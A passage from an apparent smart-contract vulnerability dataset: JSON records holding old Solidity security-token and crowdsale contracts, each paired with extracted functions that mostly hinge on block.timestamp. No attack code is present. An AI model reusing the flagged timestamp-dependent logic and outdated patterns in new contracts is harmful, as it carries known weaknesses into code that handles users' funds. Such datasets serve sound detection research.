tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1fa1"
  },
  "filename": "9889.sol",
  "content": "pragma solidity ^0.4.13;\ninterface IAffiliateList {\n function set(address addr, uint startTimestamp, uint endTimestamp) external;\n function get(address addr) external view returns (uint start, uint end);\n function inListAsOf(address addr, uint time) external view returns (bool);\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract IInvestorList {\n string public constant ROLE_REGD = \"regd\";\n string public constant ROLE_REGCF = \"regcf\";\n string public constant ROLE_REGS = \"regs\";\n string public constant ROLE_UNKNOWN = \"unknown\";\n function inList(address addr) public view returns (bool);\n function addAddress(address addr, string role) public;\n function getRole(address addr) public view returns (string);\n function hasRole(address addr, string role) public view returns (bool);\n}\ncontract Ownable {\n address public owner;\n address public newOwner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function changeOwner(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n if (msg.sender == newOwner) {\n owner = newOwner;\n newOwner = 0;\n }\n }\n}\ncontract AffiliateList is Ownable, IAffiliateList {\n event AffiliateAdded(address addr, uint startTimestamp, uint endTimestamp);\n event AffiliateUpdated(address addr, uint startTimestamp, uint endTimestamp);\n mapping (address => uint) public affiliateStart;\n mapping (address => uint) public affiliateEnd;\n function set(address addr, uint startTimestamp, uint endTimestamp) public onlyOwner {\n require(addr != address(0));\n uint existingStart = affiliateStart[addr];\n if(existingStart == 0) {\n require(startTimestamp != 0);\n affiliateStart[addr] = startTimestamp;\n if(endTimestamp != 0) {\n require(endTimestamp > startTimestamp);\n affiliateEnd[addr] = endTimestamp;\n }\n emit AffiliateAdded(addr, startTimestamp, endTimestamp);\n }\n else {\n if(startTimestamp == 0) {\n if(endTimestamp == 0) {\n affiliateStart[addr] = 0;\n affiliateEnd[addr] = 0;\n }\n else {\n require(endTimestamp > existingStart);\n }\n }\n else {\n affiliateStart[addr] = startTimestamp;\n if(endTimestamp != 0) {\n require(endTimestamp > startTimestamp);\n }\n }\n affiliateEnd[addr] = endTimestamp;\n emit AffiliateUpdated(addr, startTimestamp, endTimestamp);\n }\n }\n function get(address addr) public view returns (uint start, uint end) {\n return (affiliateStart[addr], affiliateEnd[addr]);\n }\n function inListAsOf(address addr, uint time) public view returns (bool) {\n uint start;\n uint end;\n (start, end) = get(addr);\n if(start == 0) {\n return false;\n }\n if(time < start) {\n return false;\n }\n if(end != 0 && time >= end) {\n return false;\n }\n return true;\n }\n}\ncontract InvestorList is Ownable, IInvestorList {\n event AddressAdded(address addr, string role);\n event AddressRemoved(address addr, string role);\n mapping (address => string) internal investorList;\n modifier validRole(string role) {\n require(\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGD)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGCF)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGS)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_UNKNOWN))\n );\n _;\n }\n function inList(address addr)\n public\n view\n returns (bool)\n {\n if (bytes(investorList[addr]).length != 0) {\n return true;\n } else {\n return false;\n }\n }\n function getRole(address addr)\n public\n view\n returns (string)\n {\n require(inList(addr));\n return investorList[addr];\n }\n function hasRole(address addr, string role)\n public\n view\n returns (bool)\n {\n return keccak256(bytes(role)) == keccak256(bytes(investorList[addr]));\n }\n function addAddress(address addr, string role)\n onlyOwner\n validRole(role)\n public\n {\n investorList[addr] = role;\n emit AddressAdded(addr, role);\n }\n function addAddresses(address[] addrs, string role)\n onlyOwner\n validRole(role)\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n addAddress(addrs[i], role);\n }\n }\n function removeAddress(address addr)\n onlyOwner\n public\n {\n require(inList(addr));\n string memory role = investorList[addr];\n investorList[addr] = \"\";\n emit AddressRemoved(addr, role);\n }\n function removeAddresses(address[] addrs)\n onlyOwner\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (inList(addrs[i])) {\n removeAddress(addrs[i]);\n }\n }\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ISecurityController {\n function balanceOf(address _a) public view returns (uint);\n function totalSupply() public view returns (uint);\n function isTransferAuthorized(address _from, address _to) public view returns (bool);\n function setTransferAuthorized(address from, address to, uint expiry) public;\n function transfer(address _from, address _to, uint _value) public returns (bool success);\n function transferFrom(address _spender, address _from, address _to, uint _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint);\n function approve(address _owner, address _spender, uint _value) public returns (bool success);\n function increaseApproval(address _owner, address _spender, uint _addedValue) public returns (bool success);\n function decreaseApproval(address _owner, address _spender, uint _subtractedValue) public returns (bool success);\n function burn(address _owner, uint _amount) public;\n function ledgerTransfer(address from, address to, uint val) public;\n function setLedger(address _ledger) public;\n function setSale(address _sale) public;\n function setToken(address _token) public;\n function setAffiliateList(address _affiliateList) public;\n}\ncontract SecurityController is ISecurityController, Ownable {\n ISecurityLedger public ledger;\n ISecurityToken public token;\n ISecuritySale public sale;\n IInvestorList public investorList;\n ITransferAuthorizations public transferAuthorizations;\n IAffiliateList public affiliateList;\n uint public lockoutPeriod = 10 * 60 * 60;\n mapping(address => bool) public transferAuthPermission;\n constructor() public {\n }\n function setTransferAuthorized(address from, address to, uint expiry) public {\n require(transferAuthPermission[msg.sender]);\n require(from != 0);\n if(expiry > 0) {\n require(expiry > block.timestamp);\n require(expiry <= (block.timestamp + 30 days));\n }\n transferAuthorizations.set(from, to, expiry);\n }\n function setLockoutPeriod(uint _lockoutPeriod) public onlyOwner {\n lockoutPeriod = _lockoutPeriod;\n }\n function setToken(address _token) public onlyOwner {\n token = ISecurityToken(_token);\n }\n function setLedger(address _ledger) public onlyOwner {\n ledger = ISecurityLedger(_ledger);\n }\n function setSale(address _sale) public onlyOwner {\n sale = ISecuritySale(_sale);\n }\n function setInvestorList(address _investorList) public onlyOwner {\n investorList = IInvestorList(_investorList);\n }\n function setTransferAuthorizations(address _transferAuthorizations) public onlyOwner {\n transferAuthorizations = ITransferAuthorizations(_transferAuthorizations);\n }\n function setAffiliateList(address _affiliateList) public onlyOwner {\n affiliateList = IAffiliateList(_affiliateList);\n }\n function setTransferAuthPermission(address agent, bool hasPermission) public onlyOwner {\n require(agent != address(0));\n transferAuthPermission[agent] = hasPermission;\n }\n modifier onlyToken() {\n require(msg.sender == address(token));\n _;\n }\n modifier onlyLedger() {\n require(msg.sender == address(ledger));\n _;\n }\n function totalSupply() public view returns (uint) {\n return ledger.totalSupply();\n }\n function balanceOf(address _a) public view returns (uint) {\n return ledger.balanceOf(_a);\n }\n function allowance(address _owner, address _spender) public view returns (uint) {\n return ledger.allowance(_owner, _spender);\n }\n function isTransferAuthorized(address _from, address _to) public view returns (bool) {\n uint expiry = transferAuthorizations.get(_from, _to);\n uint globalExpiry = transferAuthorizations.get(_from, 0);\n if(globalExpiry > expiry) {\n expiry = globalExpiry;\n }\n return expiry > block.timestamp;\n }\n function checkTransfer(address _from, address _to, uint _value, uint lockoutTime)\n public\n returns (bool canTransfer, bool useLockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) {\n preservePurchaseDate = false;\n bool transferIsAuthorized = isTransferAuthorized(_from, _to);\n bool fromIsAffiliate = affiliateList.inListAsOf(_from, block.timestamp);\n bool toIsAffiliate = affiliateList.inListAsOf(_to, block.timestamp);\n if(transferIsAuthorized) {\n canTransfer = true;\n if(fromIsAffiliate || toIsAffiliate) {\n newTokensAreRestricted = true;\n }\n }\n else if(!fromIsAffiliate) {\n if(investorList.hasRole(_from, investorList.ROLE_REGS())\n && investorList.hasRole(_to, investorList.ROLE_REGS())) {\n canTransfer = true;\n }\n else {\n if(ledger.transferDryRun(_from, _to, _value, lockoutTime) == _value) {\n canTransfer = true;\n useLockoutTime = true;\n }\n }\n }\n }\n function ledgerTransfer(address from, address to, uint val) public onlyLedger {\n token.controllerTransfer(from, to, val);\n }\n function transfer(address _from, address _to, uint _value) public onlyToken returns (bool success) {\n uint lockoutTime = block.timestamp - lockoutPeriod;\n bool canTransfer;\n bool useLockoutTime;\n bool newTokensAreRestricted;\n bool preservePurchaseDate;\n (canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n = checkTransfer(_from, _to, _value, lockoutTime);\n if(!canTransfer) {\n return false;\n }\n uint overrideLockoutTime = lockoutTime;\n if(!useLockoutTime) {\n overrideLockoutTime = 0;\n }\n return ledger.transfer(_from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n }\n function transferFrom(address _spender, address _from, address _to, uint _value) public onlyToken returns (bool success) {\n uint lockoutTime = block.timestamp - lockoutPeriod;\n bool canTransfer;\n bool useLockoutTime;\n bool newTokensAreRestricted;\n bool preservePurchaseDate;\n (canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n = checkTransfer(_from, _to, _value, lockoutTime);\n if(!canTransfer) {\n return false;\n }\n uint overrideLockoutTime = lockoutTime;\n if(!useLockoutTime) {\n overrideLockoutTime = 0;\n }\n return ledger.transferFrom(_spender, _from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n }\n function approve(address _owner, address _spender, uint _value) public onlyToken returns (bool success) {\n return ledger.approve(_owner, _spender, _value);\n }\n function increaseApproval (address _owner, address _spender, uint _addedValue) public onlyToken returns (bool success) {\n return ledger.increaseApproval(_owner, _spender, _addedValue);\n }\n function decreaseApproval (address _owner, address _spender, uint _subtractedValue) public onlyToken returns (bool success) {\n return ledger.decreaseApproval(_owner, _spender, _subtractedValue);\n }\n function burn(address _owner, uint _amount) public onlyToken {\n ledger.burn(_owner, _amount);\n }\n}\ninterface ISecurityLedger {\n function balanceOf(address _a) external view returns (uint);\n function totalSupply() external view returns (uint);\n function transferDryRun(address _from, address _to, uint amount, uint lockoutTime) external returns (uint transferrableCount);\n function transfer(address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) external returns (bool success);\n function transferFrom(address _spender, address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint);\n function approve(address _owner, address _spender, uint _value) external returns (bool success);\n function increaseApproval(address _owner, address _spender, uint _addedValue) external returns (bool success);\n function decreaseApproval(address _owner, address _spender, uint _subtractedValue) external returns (bool success);\n function burn(address _owner, uint _amount) external;\n function setController(address _controller) external;\n}\ncontract SecurityLedger is Ownable {\n using SafeMath for uint256;\n struct TokenLot {\n uint amount;\n uint purchaseDate;\n bool restricted;\n }\n mapping(address => TokenLot[]) public tokenLotsOf;\n SecurityController public controller;\n mapping(address => uint) public balanceOf;\n mapping (address => mapping (address => uint)) public allowance;\n uint public totalSupply;\n uint public mintingNonce;\n bool public mintingStopped;\n constructor() public {\n }\n function setController(address _controller) public onlyOwner {\n controller = SecurityController(_controller);\n }\n function stopMinting() public onlyOwner {\n mintingStopped = true;\n }\n function mint(address addr, uint value, uint timestamp) public onlyOwner {\n require(!mintingStopped);\n uint time = timestamp;\n if(time == 0) {\n time = block.timestamp;\n }\n balanceOf[addr] = balanceOf[addr].add(value);\n tokenLotsOf[addr].push(TokenLot(value, time, true));\n controller.ledgerTransfer(0, addr, value);\n totalSupply = totalSupply.add(value);\n }\n function multiMint(uint nonce, uint256[] bits, uint timestamp) external onlyOwner {\n require(!mintingStopped);\n if (nonce != mintingNonce) return;\n mintingNonce = mintingNonce.add(1);\n uint256 lomask = (1 << 96) - 1;\n uint created = 0;\n uint time = timestamp;\n if(time == 0) {\n time = block.timestamp;\n }\n for (uint i = 0; i < bits.length; i++) {\n address addr = address(bits[i]>>96);\n uint value = bits[i] & lomask;\n balanceOf[addr] = balanceOf[addr].add(value);\n tokenLotsOf[addr].push(TokenLot(value, time, true));\n controller.ledgerTransfer(0, addr, value);\n created = created.add(value);\n }\n totalSupply = totalSupply.add(created);\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n modifier onlyController() {\n require(msg.sender == address(controller));\n _;\n }\n function walkTokenLots(address from, address to, uint amount, uint lockoutTime, bool removeTokens,\n bool newTokensAreRestricted, bool preservePurchaseDate)\n internal returns (uint numTransferrableTokens)\n {\n TokenLot[] storage fromTokenLots = tokenLotsOf[from];\n for(uint i=0; i<fromTokenLots.length; i++) {\n TokenLot storage lot = fromTokenLots[i];\n uint lotAmount = lot.amount;\n if(lotAmount == 0) {\n continue;\n }\n if(lockoutTime > 0) {\n if(lot.restricted && lot.purchaseDate > lockoutTime) {\n continue;\n }\n }\n uint remaining = amount - numTransferrableTokens;\n if(lotAmount >= remaining) {\n numTransferrableTokens = numTransferrableTokens.add(remaining);\n if(removeTokens) {\n lot.amount = lotAmount.sub(remaining);\n if(to != address(0)) {\n if(preservePurchaseDate) {\n tokenLotsOf[to].push(TokenLot(remaining, lot.purchaseDate, newTokensAreRestricted));\n }\n else {\n tokenLotsOf[to].push(TokenLot(remaining, block.timestamp, newTokensAreRestricted));\n }\n }\n }\n break;\n }\n numTransferrableTokens = numTransferrableTokens.add(lotAmount);\n if(removeTokens) {\n lot.amount = 0;\n if(to != address(0)) {\n if(preservePurchaseDate) {\n tokenLotsOf[to].push(TokenLot(lotAmount, lot.purchaseDate, newTokensAreRestricted));\n }\n else {\n tokenLotsOf[to].push(TokenLot(lotAmount, block.timestamp, newTokensAreRestricted));\n }\n }\n }\n }\n }\n function transferDryRun(address from, address to, uint amount, uint lockoutTime) public onlyController returns (uint) {\n return walkTokenLots(from, to, amount, lockoutTime, false, false, false);\n }\n function transfer(address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) public onlyController returns (bool success) {\n if (balanceOf[_from] < _value) return false;\n uint tokensTransferred = walkTokenLots(_from, _to, _value, lockoutTime, true, newTokensAreRestricted, preservePurchaseDate);\n require(tokensTransferred == _value);\n balanceOf[_from] = balanceOf[_from].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n return true;\n }\n function transferFrom(address _spender, address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) public onlyController returns (bool success) {\n if (balanceOf[_from] < _value) return false;\n uint allowed = allowance[_from][_spender];\n if (allowed < _value) return false;\n uint tokensTransferred = walkTokenLots(_from, _to, _value, lockoutTime, true, newTokensAreRestricted, preservePurchaseDate);\n require(tokensTransferred == _value);\n balanceOf[_from] = balanceOf[_from].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n allowance[_from][_spender] = allowed.sub(_value);\n return true;\n }\n function approve(address _owner, address _spender, uint _value) public onlyController returns (bool success) {\n if ((_value != 0) && (allowance[_owner][_spender] != 0)) {\n return false;\n }\n allowance[_owner][_spender] = _value;\n return true;\n }\n function increaseApproval (address _owner, address _spender, uint _addedValue) public onlyController returns (bool success) {\n uint oldValue = allowance[_owner][_spender];\n allowance[_owner][_spender] = oldValue.add(_addedValue);\n return true;\n }\n function decreaseApproval (address _owner, address _spender, uint _subtractedValue) public onlyController returns (bool success) {\n uint oldValue = allowance[_owner][_spender];\n if (_subtractedValue > oldValue) {\n allowance[_owner][_spender] = 0;\n } else {\n allowance[_owner][_spender] = oldValue.sub(_subtractedValue);\n }\n return true;\n }\n function burn(address _owner, uint _amount) public onlyController {\n require(balanceOf[_owner] >= _amount);\n balanceOf[_owner] = balanceOf[_owner].sub(_amount);\n walkTokenLots(_owner, address(0), _amount, 0, true, false, false);\n totalSupply = totalSupply.sub(_amount);\n }\n}\ninterface ISecuritySale {\n function setLive(bool newLiveness) external;\n function setInvestorList(address _investorList) external;\n}\ncontract SecuritySale is Ownable {\n bool public live;\n IInvestorList public investorList;\n event SaleLive(bool liveness);\n event EtherIn(address from, uint amount);\n event StartSale();\n event EndSale();\n constructor() public {\n live = false;\n }\n function setInvestorList(address _investorList) public onlyOwner {\n investorList = IInvestorList(_investorList);\n }\n function () public payable {\n require(live);\n require(investorList.inList(msg.sender));\n emit EtherIn(msg.sender, msg.value);\n }\n function setLive(bool newLiveness) public onlyOwner {\n if(live && !newLiveness) {\n live = false;\n emit EndSale();\n }\n else if(!live && newLiveness) {\n live = true;\n emit StartSale();\n }\n }\n function withdraw() public onlyOwner {\n msg.sender.transfer(address(this).balance);\n }\n function withdrawSome(uint value) public onlyOwner {\n require(value <= address(this).balance);\n msg.sender.transfer(value);\n }\n function withdrawTokens(address token) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(msg.sender, t.balanceOf(this)));\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n}\ninterface ISecurityToken {\n function balanceOf(address addr) external view returns(uint);\n function transfer(address to, uint amount) external returns(bool);\n function controllerTransfer(address _from, address _to, uint _value) external;\n}\ncontract SecurityToken is Ownable{\n using SafeMath for uint256;\n ISecurityController public controller;\n string public name;\n string public symbol;\n uint8 public decimals;\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n constructor(string _name, string _symbol, uint8 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n function setController(address _c) public onlyOwner {\n controller = ISecurityController(_c);\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n function balanceOf(address a) public view returns (uint) {\n return controller.balanceOf(a);\n }\n function totalSupply() public view returns (uint) {\n return controller.totalSupply();\n }\n function allowance(address _owner, address _spender) public view returns (uint) {\n return controller.allowance(_owner, _spender);\n }\n function burn(uint _amount) public {\n controller.burn(msg.sender, _amount);\n emit Transfer(msg.sender, 0x0, _amount);\n }\n modifier onlyPayloadSize(uint numwords) {\n assert(msg.data.length >= numwords.mul(32).add(4));\n _;\n }\n function isTransferAuthorized(address _from, address _to) public onlyPayloadSize(2) view returns (bool) {\n return controller.isTransferAuthorized(_from, _to);\n }\n function transfer(address _to, uint _value) public onlyPayloadSize(2) returns (bool success) {\n if (controller.transfer(msg.sender, _to, _value)) {\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n return false;\n }\n function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3) returns (bool success) {\n if (controller.transferFrom(msg.sender, _from, _to, _value)) {\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n function approve(address _spender, uint _value) onlyPayloadSize(2) public returns (bool success) {\n if (controller.approve(msg.sender, _spender, _value)) {\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n return false;\n }\n function increaseApproval (address _spender, uint _addedValue) public onlyPayloadSize(2) returns (bool success) {\n if (controller.increaseApproval(msg.sender, _spender, _addedValue)) {\n uint newval = controller.allowance(msg.sender, _spender);\n emit Approval(msg.sender, _spender, newval);\n return true;\n }\n return false;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public onlyPayloadSize(2) returns (bool success) {\n if (controller.decreaseApproval(msg.sender, _spender, _subtractedValue)) {\n uint newval = controller.allowance(msg.sender, _spender);\n emit Approval(msg.sender, _spender, newval);\n return true;\n }\n return false;\n }\n modifier onlyController() {\n assert(msg.sender == address(controller));\n _;\n }\n function controllerTransfer(address _from, address _to, uint _value) public onlyController {\n emit Transfer(_from, _to, _value);\n }\n function controllerApprove(address _owner, address _spender, uint _value) public onlyController {\n emit Approval(_owner, _spender, _value);\n }\n}\ninterface ITransferAuthorizations {\n function setController(address _controller) external;\n function get(address from, address to) external view returns (uint);\n function set(address from, address to, uint expiry) external;\n}\ncontract TransferAuthorizations is Ownable, ITransferAuthorizations {\n mapping(address => mapping(address => uint)) public authorizations;\n address public controller;\n event TransferAuthorizationSet(address from, address to, uint expiry);\n function setController(address _controller) public onlyOwner {\n controller = _controller;\n }\n modifier onlyController() {\n assert(msg.sender == controller);\n _;\n }\n function set(address from, address to, uint expiry) public onlyController {\n require(from != 0);\n authorizations[from][to] = expiry;\n emit TransferAuthorizationSet(from, to, expiry);\n }\n function get(address from, address to) public view returns (uint) {\n return authorizations[from][to];\n }\n}",
  "extract_feature": [
    "function setTransferAuthorized(address from, address to, uint expiry) public {\nrequire(transferAuthPermission[msg.sender]);\nrequire(from != 0);\nif(expiry > 0) {\nrequire(expiry > block.timestamp);\nrequire(expiry <= (block.timestamp + 30 days));\n}\ntransferAuthorizations.set(from, to, expiry);\n}",
    "function isTransferAuthorized(address _from, address _to) public view returns (bool) {\nuint expiry = transferAuthorizations.get(_from, _to);\nuint globalExpiry = transferAuthorizations.get(_from, 0);\nif(globalExpiry > expiry) {\nexpiry = globalExpiry;\n}\nreturn expiry > block.timestamp;\n}",
    "function transfer(address _from, address _to, uint _value) public onlyToken returns (bool success) {\nuint lockoutTime = block.timestamp - lockoutPeriod;\nbool canTransfer;\nbool useLockoutTime;\nbool newTokensAreRestricted;\nbool preservePurchaseDate;\n(canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n= checkTransfer(_from, _to, _value, lockoutTime);\nif(!canTransfer) {\nreturn false;\n}\nuint overrideLockoutTime = lockoutTime;\nif(!useLockoutTime) {\noverrideLockoutTime = 0;\n}\nreturn ledger.transfer(_from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n}",
    "function transferFrom(address _spender, address _from, address _to, uint _value) public onlyToken returns (bool success) {\nuint lockoutTime = block.timestamp - lockoutPeriod;\nbool canTransfer;\nbool useLockoutTime;\nbool newTokensAreRestricted;\nbool preservePurchaseDate;\n(canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n= checkTransfer(_from, _to, _value, lockoutTime);\nif(!canTransfer) {\nreturn false;\n}\nuint overrideLockoutTime = lockoutTime;\nif(!useLockoutTime) {\noverrideLockoutTime = 0;\n}\nreturn ledger.transferFrom(_spender, _from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n}",
    "function mint(address addr, uint value, uint timestamp) public onlyOwner {\nrequire(!mintingStopped);\nuint time = timestamp;\nif(time == 0) {\ntime = block.timestamp;\n}\nbalanceOf[addr] = balanceOf[addr].add(value);\ntokenLotsOf[addr].push(TokenLot(value, time, true));\ncontroller.ledgerTransfer(0, addr, value);\ntotalSupply = totalSupply.add(value);\n}",
    "function multiMint(uint nonce, uint256[] bits, uint timestamp) external onlyOwner {\nrequire(!mintingStopped);\nif (nonce != mintingNonce) return;\nmintingNonce = mintingNonce.add(1);\nuint256 lomask = (1 << 96) - 1;\nuint created = 0;\nuint time = timestamp;\nif(time == 0) {\ntime = block.timestamp;\n}\nfor (uint i = 0; i < bits.length; i++) {\naddress addr = address(bits[i]>>96);\nuint value = bits[i] & lomask;\nbalanceOf[addr] = balanceOf[addr].add(value);\ntokenLotsOf[addr].push(TokenLot(value, time, true));\ncontroller.ledgerTransfer(0, addr, value);\ncreated = created.add(value);\n}\ntotalSupply = totalSupply.add(created);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1fa2"
  },
  "filename": "9890.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, 